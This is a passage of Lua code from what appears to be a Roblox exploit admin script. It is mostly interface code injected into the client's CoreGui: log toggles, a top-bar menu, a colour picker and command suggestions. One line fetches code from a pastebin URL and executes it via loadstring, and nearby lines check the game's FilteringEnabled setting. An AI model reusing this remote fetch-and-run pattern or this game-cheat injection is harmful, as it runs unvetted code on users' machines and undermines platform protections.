chatsV = true
CheckBox_2.Image = checked updatefile() end end)
if whispersV == true then
CheckBox.Image = checked else
CheckBox.Image = unchecked end
box.MouseButton1Down:connect(function()
if whispersV == true then whispersV = false
CheckBox.Image = unchecked updatefile() else
whispersV = true
CheckBox.Image = checked updatefile() end end)
if commandsV == true then
CheckBox_3.Image = checked else
CheckBox_3.Image = unchecked end
box_3.MouseButton1Down:connect(function()
if commandsV == true then commandsV = false
CheckBox_3.Image = unchecked updatefile() else
commandsV = true
CheckBox_3.Image = checked updatefile() end end)
clear.MouseButton1Down:connect(function()
for _, child in pairs( scroll:GetChildren()) do
child:Destroy() end
scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
end)
Exit.MouseButton1Down:connect(function()
logdrag:TweenPosition(UDim2.new(0.5, -225, 0, -400), "InOut", "Quart", 0.5, true, nil)
logsopen = false
end)
local hidden = false
Hide.MouseButton1Down:connect(function()
if hidden == false then hidden = true
ContainerFrame:TweenPosition(UDim2.new(0, 0, 0, -300), "InOut", "Quart", 0.5, true, nil)
else ContainerFrame:TweenPosition(UDim2.new(0, 0, 0, 29), "InOut", "Quart", 0.5, true, nil) hidden = false
end end)
function logtime() -- time function from aperture 
	local HOUR = math.floor((tick() % 86400) / 3600)
	local MINUTE = math.floor((tick() % 3600) / 60)
	local SECOND = math.floor(tick() % 60)
	local AP = HOUR > 11 and 'PM' or 'AM'
	HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
	HOUR = HOUR < 10 and '0' .. HOUR or HOUR
	MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
	SECOND = SECOND < 10 and '0' .. SECOND or SECOND
	return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP end
function CreateLabel(Name, Text)
	local sf = scroll
	if #sf:GetChildren() >= 2546 then
		sf:ClearAllChildren()
	end
	local alls = 0
	for i,v in pairs(sf:GetChildren()) do
		if v then
			alls = v.Size.Y.Offset + alls
		end
		if not v then
			alls = 0
		end
	end
	local tl = Instance.new('TextLabel', sf)
	local il = Instance.new('Frame', tl)
	tl.Name = Name
	tl.ZIndex = 6
	tl.Text = logtime().." - ["..Name.."]: "..Text
	tl.Size = UDim2.new(0,410,0,84)
	tl.BackgroundTransparency = 1
	tl.BorderSizePixel = 0
	tl.Font = "SourceSansBold"
	tl.Position = UDim2.new(-1,0,0,alls)
	tl.TextTransparency = 1
	tl.TextScaled = false
	tl.TextSize = 14
	tl.TextWrapped = true
	tl.TextXAlignment = "Left"
	tl.TextYAlignment = "Top"
	il.BackgroundTransparency = 1
	il.BorderSizePixel = 0
	il.Size = UDim2.new(0,12,1,0)
	il.Position = UDim2.new(0,410,0,0)
	tl.TextColor3 = Color3.fromRGB(255,255,255)
	tl.Size = UDim2.new(0,410,0,tl.TextBounds.Y)
	sf.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
	sf.CanvasPosition = Vector2.new(0,sf.CanvasPosition.Y+tl.TextBounds.Y)
	local size2 = sf.CanvasSize.Y.Offset
	tl:TweenPosition(UDim2.new(0,0,0,alls), 'In', 'Quint', 0.5)
	for i = 0,50 do wait(0.05)
		tl.TextTransparency = tl.TextTransparency - 0.05
	end
	tl.TextTransparency = 0
end logsloaded = true
local intro = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Circle = Instance.new("ImageLabel")
local ImageLabel = Instance.new("ImageLabel")
intro.Name = "intro"
intro.Parent = game.CoreGui
Frame.Parent = intro
Frame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.5, -125, 0.5, -125)
Frame.Size = UDim2.new(0, 250, 0, 250)
Circle.Name = "Circle"
Circle.Parent = Frame
Circle.BackgroundColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Circle.BackgroundTransparency = 1
Circle.BorderSizePixel = 0
Circle.Position = UDim2.new(0.5, 0, 0.5, 0)
Circle.Image = "rbxassetid://631172870"
Circle.ImageColor3 = Color3.new(0.121569, 0.121569, 0.121569)
ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel.Image = "rbxassetid://1352543873"
Loading.ba:TweenSize(UDim2.new(0.35, 0, 1, 0), "InOut", "Quart", 0.5, true, nil)
local g = intro
local f = Frame
local imagef = Circle
local logof = ImageLabel
loadedintro = false
local function tween2()
f:TweenSizeAndPosition(UDim2.new(0,250,0,250),UDim2.new(0.5,-125,0.5,-125), "Out", "Quart", 0.4)
wait(0.6) loadedintro = true end
local function tween1()
f:TweenSizeAndPosition(UDim2.new(0,300,0,300),UDim2.new(0.5,-150,0.5,-150), "In", "Quart", 0.4, false, tween2) end
imagef:TweenSizeAndPosition(UDim2.new(3,0,3,0),UDim2.new(-1,0,-1,0), "Out", "Linear", 0.4)
logof:TweenSizeAndPosition(UDim2.new(1,0,1,0),UDim2.new(0,0,0,0), "Out", "Linear", 0.4, false, tween1)
if pcall(function() loadstring(game:HttpGet(('https://pastebin.com/raw/wcEw3rW9'),true))() end) then
	if workspace.FilteringEnabled == true then
		Notify('Filtering ENABLED '..ServerMessage)
	elseif workspace.FilteringEnabled == false then
		Notify('Filtering Disabled '..ServerMessage)
	end
else
	if workspace.FilteringEnabled == true then
		Notify('Filtering ENABLED')
	elseif
		workspace.FilteringEnabled == false then
		Notify('Filtering Disabled')
	end
end
Loading.ba:TweenSize(UDim2.new(0.45, 0, 1, 0), "InOut", "Quart", 0.4, true, nil)
local iy = Instance.new("ImageButton") local sheild = Instance.new("Frame") local cmds = Instance.new("ImageButton") local cmds_2 = Instance.new("TextLabel")
local settings = Instance.new("ImageButton") local settings_2 = Instance.new("TextLabel") local updates = Instance.new("ImageButton") local updates_2 = Instance.new("TextLabel")
local info = Instance.new("ImageButton") local info_2 = Instance.new("TextLabel") local mix = Instance.new("ImageButton") local mix_2 = Instance.new("TextLabel") local MAIN = Instance.new("TextLabel") iy.Name = "iy" iy.Parent = game.CoreGui.RobloxGui.TopBarContainer
iy.BackgroundTransparency = 1 iy.Position = UDim2.new(0, 2, 0, -38) iy.Size = UDim2.new(0, 50, 0, 36) iy.AutoButtonColor = false sheild.Name = "sheild" sheild.Parent = iy sheild.BackgroundColor3 = Color3.new(1, 1, 1)
sheild.BackgroundTransparency = 1 sheild.Size = UDim2.new(0, 320, 0, 35) cmds.Name = "cmds" cmds.Parent = sheild cmds.BackgroundTransparency = 1 cmds.Position = UDim2.new(0, 50, 0, 0) cmds.Size = UDim2.new(0, 80, 0, 36)
cmds.AutoButtonColor = false cmds_2.Name = "cmds" cmds_2.Parent = cmds cmds_2.BackgroundColor3 = Color3.new(1, 1, 1) cmds_2.BackgroundTransparency = 1 cmds_2.Position = UDim2.new(0, 0, 0, -2)
cmds_2.Size = UDim2.new(0, 80, 0, 40) cmds_2.Font = Enum.Font.Arial cmds_2.FontSize = Enum.FontSize.Size14 cmds_2.Text = "Commands" cmds_2.TextColor3 = Color3.new(1, 1, 1) cmds_2.TextStrokeTransparency = 0.69999998807907
settings.Name = "settings" settings.Parent = sheild settings.BackgroundTransparency = 1 settings.Position = UDim2.new(0, 146, 0, 0) settings.Size = UDim2.new(0, 60, 0, 36) settings.AutoButtonColor = false
settings_2.Name = "settings" settings_2.Parent = settings settings_2.BackgroundColor3 = Color3.new(1, 1, 1) settings_2.BackgroundTransparency = 1 settings_2.Position = UDim2.new(0, 0, 0, -2)
settings_2.Size = UDim2.new(0, 60, 0, 40) settings_2.Font = Enum.Font.Arial settings_2.FontSize = Enum.FontSize.Size14 settings_2.Text = "Script Hub" settings_2.TextColor3 = Color3.new(1, 1, 1)
settings_2.TextStrokeTransparency = 0.69999998807907 updates.Name = "updates" updates.Parent = sheild updates.BackgroundTransparency = 1 updates.Position = UDim2.new(0, 220, 0, 0)
updates.Size = UDim2.new(0, 60, 0, 36) updates.AutoButtonColor = false updates_2.Name = "updates" updates_2.Parent = updates updates_2.BackgroundColor3 = Color3.new(1, 1, 1) updates_2.BackgroundTransparency = 1
updates_2.Position = UDim2.new(0, 0, 0, -2) updates_2.Size = UDim2.new(0, 60, 0, 40) updates_2.Font = Enum.Font.Arial updates_2.FontSize = Enum.FontSize.Size14
updates_2.Text = "Server" updates_2.TextColor3 = Color3.new(1, 1, 1) updates_2.TextStrokeTransparency = 0.69999998807907 info.Name = "info" info.Parent = sheild info.BackgroundTransparency = 1 info.Position = UDim2.new(0, 290, 0, 0)
info.Size = UDim2.new(0, 35, 0, 36) info.AutoButtonColor = false info_2.Name = "info" info_2.Parent = info info_2.BackgroundColor3 = Color3.new(1, 1, 1) info_2.BackgroundTransparency = 1 info_2.Position = UDim2.new(0, 0, 0, -2)
info_2.Size = UDim2.new(0, 30, 0, 40) info_2.Font = Enum.Font.Arial info_2.FontSize = Enum.FontSize.Size14 info_2.Text = "Info" info_2.TextColor3 = Color3.new(1, 1, 1)
mix.Name = "mix" mix.Parent = sheild mix.BackgroundTransparency = 1 mix.Position = UDim2.new(0, 340, 0, 0)
mix.Size = UDim2.new(0, 35, 0, 36) mix.AutoButtonColor = false mix_2.Name = "mix" mix_2.Parent = mix mix_2.BackgroundColor3 = Color3.new(1, 1, 1) mix_2.BackgroundTransparency = 1 mix_2.Position = UDim2.new(0, 0, 0, -2)
mix_2.Size = UDim2.new(0, 30, 0, 40) mix_2.Font = Enum.Font.Arial mix_2.FontSize = Enum.FontSize.Size14 mix_2.Text = "Color" mix_2.TextColor3 = Color3.new(1, 1, 1) mix_2.TextStrokeTransparency = 0.7
lockic = Instance.new("ImageLabel")
lockic.Name = "lock"
lockic.Parent = iy
lockic.BackgroundColor3 = Color3.new(1, 1, 1)
lockic.BackgroundTransparency = 1
lockic.ImageTransparency = 1
lockic.BorderSizePixel = 0
lockic.Position = UDim2.new(0, 53, 0, -3)
lockic.Size = UDim2.new(0, 40, 0, 40)
lockic.Image = "rbxassetid://1495252742"
info_2.TextStrokeTransparency = 0.69999998807907 MAIN.Name = "MAIN" MAIN.Parent = iy MAIN.BackgroundColor3 = Color3.new(1, 1, 1) MAIN.BackgroundTransparency = 1 MAIN.Position = UDim2.new(0, 2, 0, -2)
MAIN.Size = UDim2.new(0, 40, 0, 40) MAIN.Font = Enum.Font.ArialBold MAIN.FontSize = Enum.FontSize.Size24 MAIN.Text = "IY" MAIN.TextColor3 = Color3.new(1, 1, 1) MAIN.TextStrokeTransparency = 0.69999998807907
quickmenu = (function()
    local rg = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
    if not rg then return nil end
    local tbc = rg:FindFirstChild("TopBarContainer")
        or rg:FindFirstChild("TopBarApp")
        or rg:FindFirstChild("ExperienceTopBar")
    if not tbc then return nil end
    return tbc:FindFirstChild("iy")
end)()
local TopBarContainer = Instance.new("Frame") TopBarContainer.Name = "TopBarContainer" TopBarContainer.Parent = game.CoreGui.RobloxGui TopBarContainer.Active = true TopBarContainer.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
TopBarContainer.BackgroundTransparency = 0.5 TopBarContainer.BorderSizePixel = 0 TopBarContainer.Position = UDim2.new(0, 0, 0, -72) TopBarContainer.Size = UDim2.new(1, 0, 0, 36) TopBarContainer.ZIndex = 0
picker = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://02011075373") picker.Parent = game.CoreGui picker.ColorPicker.Visible = false picker.ColorPicker.Position = UDim2.new(0.5, -219, 0, -500)
quickmenu.sheild.mix.MouseButton1Click:connect(function() picker.ColorPicker.Visible = true picker.ColorPicker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil) end)
PKR = picker.ColorPicker
local ColorPicker do
	ColorPicker = {}
	
	ColorPicker.new = function()
		local newMt = setmetatable({},{})
		
		local pickerGui = picker.ColorPicker
		local pickerTopBar = pickerGui.TopBar
		local pickerFrame = pickerGui.Content
		local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
		local colorStrip = pickerFrame.ColorStrip
		local previewFrame = pickerFrame.Preview
		local basicColorsFrame = pickerFrame.BasicColors
		local customColorsFrame = pickerFrame.CustomColors
		local okButton = pickerFrame.Ok
		local cancelButton = pickerFrame.Cancel
		local defaultButton = pickerFrame.Default
		rainbowButton = pickerFrame.Rainbow

		local colorScope = colorSpace.Scope
		local colorArrow = pickerFrame.ArrowFrame.Arrow

		local hueInput = pickerFrame.Hue.Input
		local satInput = pickerFrame.Sat.Input
		local valInput = pickerFrame.Val.Input

		local redInput = pickerFrame.Red.Input
		local greenInput = pickerFrame.Green.Input
		local blueInput = pickerFrame.Blue.Input

		local user = game:GetService("UserInputService")
		local mouse = game:GetService("Players").LocalPlayer:GetMouse()

		local hue,sat,val = 0,0,1
		local red,green,blue = 1,1,1
		local chosenColor = Color3.new(0,0,0)

		local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
		local customColors = {}

		local function updateColor(noupdate)
			local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
			local hsvColor = Color3.fromHSV(hue,sat,val)
	
			if noupdate == 2 or not noupdate then
				hueInput.Text = tostring(math.ceil(359*hue))
				satInput.Text = tostring(math.ceil(255*sat))
				valInput.Text = tostring(math.floor(255*val))
			end
			if noupdate == 1 or not noupdate then
				redInput.Text = tostring(math.floor(255*red))
				greenInput.Text = tostring(math.floor(255*green))
				blueInput.Text = tostring(math.floor(255*blue))
			end
	
			chosenColor = Color3.new(red,green,blue)
	
			colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
			colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
			colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
			previewFrame.BackgroundColor3 = chosenColor
			
			newMt.Color = chosenColor
			if newMt.Changed then newMt:Changed(chosenColor) end
		end

		local function colorSpaceInput()
			local relativeX = mouse.X - colorSpace.AbsolutePosition.X
			local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
				
			if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
			if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
				
			hue = (219 - relativeX)/219
			sat = (199 - relativeY)/199
	
			local hsvColor = Color3.fromHSV(hue,sat,val)
			red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
			updateColor()
		end

		local function colorStripInput()
			local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y
	
			if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
	
			val = (199 - relativeY)/199
	
			local hsvColor = Color3.fromHSV(hue,sat,val)
			red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
	
			updateColor()
		end

		local function hookButtons(frame,func)
			frame.ArrowFrame.Up.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Up.BackgroundTransparency = 0.5
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,runEvent
			
					local startTime = tick()
					local pressing = true
					local startNum = tonumber(frame.Text)
			
					if not startNum then return end
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						pressing = false
					end)
			
					startNum = startNum + 1
					func(startNum)
					while pressing do
						if tick()-startTime > 0.3 then
							startNum = startNum + 1
							func(startNum)
						end
						wait(0.1)
					end
				end
			end)
	
			frame.ArrowFrame.Up.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Up.BackgroundTransparency = 1
				end
			end)
	
			frame.ArrowFrame.Down.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Down.BackgroundTransparency = 0.5
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,runEvent
			
					local startTime = tick()
					local pressing = true
					local startNum = tonumber(frame.Text)
			
					if not startNum then return end
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
						releaseEvent:Disconnect()
						pressing = false
					end)
			
					startNum = startNum - 1
					func(startNum)
					while pressing do
						if tick()-startTime > 0.3 then
							startNum = startNum - 1
							func(startNum)
						end
						wait(0.1)
					end
				end
			end)
	
			frame.ArrowFrame.Down.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					frame.ArrowFrame.Down.BackgroundTransparency = 1
				end
			end)
		end

		colorSpace.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
		
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
            		releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
		
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						colorSpaceInput()
					end
				end)
		
				colorSpaceInput()
			end
		end)

		colorStrip.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
		
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
        		    releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
		
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						colorStripInput()
					end
				end)
		
				colorStripInput()
			end
		end)

		local function updateHue(str)
			local num = tonumber(str)
			if num then
				hue = math.clamp(math.floor(num),0,359)/359
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				hueInput.Text = tostring(hue*359)
				updateColor(1)
			end
		end
		hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)

		local function updateSat(str)
			local num = tonumber(str)
			if num then
				sat = math.clamp(math.floor(num),0,255)/255
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				satInput.Text = tostring(sat*255)
				updateColor(1)
			end
		end
		satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)

		local function updateVal(str)
			local num = tonumber(str)
			if num then
				val = math.clamp(math.floor(num),0,255)/255
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
				valInput.Text = tostring(val*255)
				updateColor(1)
			end
		end
		valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
		
		local function updateRed(str)
			local num = tonumber(str)
			if num then
				red = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = Color3.toHSV(newColor)
				redInput.Text = tostring(red*255)
				updateColor(2)
			end
		end
		redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
		
		local function updateGreen(str)
			local num = tonumber(str)
			if num then
				green = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = Color3.toHSV(newColor)
				greenInput.Text = tostring(green*255)
				updateColor(2)
			end
		end
		greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
		
		local function updateBlue(str)
			local num = tonumber(str)
			if num then
				blue = math.clamp(math.floor(num),0,255)/255
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = Color3.toHSV(newColor)
				blueInput.Text = tostring(blue*255)
				updateColor(2)
			end
		end
		blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
		
		local colorChoice = Instance.new("TextButton")
		colorChoice.Name = "Choice"
		colorChoice.Size = UDim2.new(0,25,0,18)
		colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
		colorChoice.Text = ""
		colorChoice.AutoButtonColor = false
		
		local row = 0
		local column = 0
		for i,v in pairs(basicColors) do
			local newColor = colorChoice:Clone()
			newColor.BackgroundColor3 = v
			newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
			
			newColor.MouseButton1Click:Connect(function()
				red,green,blue = v.r,v.g,v.b
				local newColor = Color3.new(red,green,blue)
				hue,sat,val = Color3.toHSV(newColor)
				updateColor()
			end)	
			
			newColor.Parent = basicColorsFrame
			column = column + 1
			if column == 6 then row = row + 1 column = 0 end
		end
		
		row = 0
		column = 0
		for i = 1,12 do
			local color = customColors[i] or Color3.new(0,0,0)
			local newColor = colorChoice:Clone()
			newColor.BackgroundColor3 = color
			newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
			
			newColor.MouseButton1Click:Connect(function()
				local curColor = customColors[i] or Color3.new(0,0,0)
				red,green,blue = curColor.r,curColor.g,curColor.b
				hue,sat,val = Color3.toHSV(curColor)
				updateColor()
			end)
			
			newColor.MouseButton2Click:Connect(function()
				customColors[i] = chosenColor
				newColor.BackgroundColor3 = chosenColor
			end)
			
			newColor.Parent = customColorsFrame
			column = column + 1
			if column == 6 then row = row + 1 column = 0 end
		end
		
		pickerTopBar.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				local releaseEvent,mouseEvent
				local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
				
				releaseEvent = user.InputEnded:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
					releaseEvent:Disconnect()
					mouseEvent:Disconnect()
				end)
				
				mouseEvent = user.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
					end
				end)
			end
		end)
		
		okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end wait(0.6) pickerGui.Visible = false end)
		okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
		okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
		
		cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end wait(0.6) pickerGui.Visible = false end)
		cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
		cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
		
		defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end wait(0.6) pickerGui.Visible = false end)
		defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
		defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)
		
		rainbowButton.MouseButton1Click:Connect(function() if newMt.Rainbow then newMt:Rainbow() end end)
		rainbowButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then rainbowButton.BackgroundTransparency = 0.4 end end)
		rainbowButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then rainbowButton.BackgroundTransparency = 0 end end)
		
		updateColor()
		
		newMt.SetColor = function(self,color)
			red,green,blue = color.r,color.g,color.b
			hue,sat,val = Color3.toHSV(color)
			updateColor()
		end
		
		return newMt
	end
end
local rainbowCount = 50
local rainbowGuiActive = false
local rainbowreset = true

spawn(function()
	local colors = {
		BrickColor.Red(),
		BrickColor.Yellow(),
		BrickColor.new('Lime green'),
		BrickColor.new('Cyan'),
		BrickColor.new('Dark indigo')
	}
	while wait() do
		for i,v in pairs(colors) do			
			for num = 1,rainbowCount do
				if rainbowGuiActive == true then
					local mimic = i-1
					if not colors[mimic] then
						mimic = #colors
					end
					mimic = colors[mimic]
					updatecolors(mimic.Color:Lerp(v.Color,num/rainbowCount))
				elseif rainbowreset == false then
					updatecolors(SAVEDCOLOR)
					rainbowreset = true
				end
				wait()
			end
		end
	end
end)
local picker = ColorPicker.new()
picker.Confirm = function(self,color) PKR:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil) SAVEDCOLOR = color updatecolors(color) updatefile() end
picker.Changed = function(self,color) updatecolors(color) end
picker.Rainbow = function(self)
if rainbowGuiActive == false then
rainbowGuiActive = true
rainbowButton.Text = 'Rainbow [Enabled]'
elseif rainbowGuiActive == true then
rainbowGuiActive = false
rainbowreset = false
rainbowButton.Text = 'Rainbow [Disabled]'
end end
picker.Cancel = function(self) PKR:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil) updatecolors(SAVEDCOLOR) end
picker.Default = function(self) PKR:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil) updatecolors(Color3.new(0.121569, 0.121569, 0.121569)) 
colorR = 0.121569 colorG = 0.121569 colorB = 0.121569 SAVEDCOLOR = Color3.new(0.121569, 0.121569, 0.121569) updatefile() end
SAVEDCOLOR = Color3.new(colorR, colorG, colorB)
local sugg = Instance.new("ScreenGui") local suggestions = Instance.new("Frame") local Title = Instance.new("TextLabel")
local SUG = Instance.new("ScrollingFrame") sugg.Name = "sugg" sugg.Parent = game.CoreGui
suggestions.Name = "suggestions" suggestions.Parent = sugg suggestions.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
suggestions.BackgroundTransparency = 0.5 suggestions.BorderColor3 = Color3.new(0, 0, 0) suggestions.BorderSizePixel = 0
suggestions.ClipsDescendants = true suggestions.Position = UDim2.new(-0.000715821981, 1, 1.03197157, -200) suggestions.Size = UDim2.new(0, 300, 0, 182)
Title.Name = "Title" Title.Parent = suggestions Title.BackgroundColor3 = Color3.new(0.639216, 0.635294, 0.647059) Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 30) Title.Font = Enum.Font.SourceSansBold Title.FontSize = Enum.FontSize.Size24 Title.Text = "Suggestions"
Title.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392) SUG.Name = "SUG" SUG.Parent = suggestions
SUG.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667) SUG.BackgroundTransparency = 1 SUG.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
SUG.BorderSizePixel = 0 SUG.Position = UDim2.new(0, 7, 0, 40) SUG.Size = UDim2.new(0, 293, 0, 130) SUG.BottomImage = "rbxasset://textures/blackBkg_square.png"
SUG.CanvasSize = UDim2.new(0, 0, 0, 5160) SUG.MidImage = "rbxasset://textures/blackBkg_square.png" SUG.ScrollBarThickness = 8 SUG.TopImage = "rbxasset://textures/blackBkg_square.png"
local CMDsV = CMDsFolder:GetChildren() for i = 1, #CMDsV do local YSize = 25 local Position = ((i * YSize) - YSize) local newcmd = Example:Clone() newcmd.Parent = SUG
newcmd.Visible = true newcmd.Position = UDim2.new(0,5,0, Position + 5) newcmd.Text = "" .. CMDsV[i].Value SUG.CanvasSize = UDim2.new(0,0,0, Position + 30) end
local CSP2 = game.CoreGui.sugg.suggestions
local main2 = CSP2
local frame2 = CSP2:WaitForChild('SUG')
Match2 = function(name,str) return name:lower():find(str:lower()) and true end
IndexContents2 = function(str,bool)
	if suggestionstoggle == true then
	if string.find(str, " ") then game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true) else
